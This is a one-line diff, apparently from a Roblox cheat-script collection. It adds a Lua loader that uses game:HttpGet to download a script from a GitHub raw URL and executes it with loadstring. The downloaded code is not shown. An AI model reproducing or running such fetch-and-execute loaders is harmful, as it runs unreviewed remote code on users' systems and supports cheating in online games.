@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/caomod2077/Script/785d8a6684dd2167e3ac87c89d8ece45574b44e1/Foxname-Dr.lua"))()
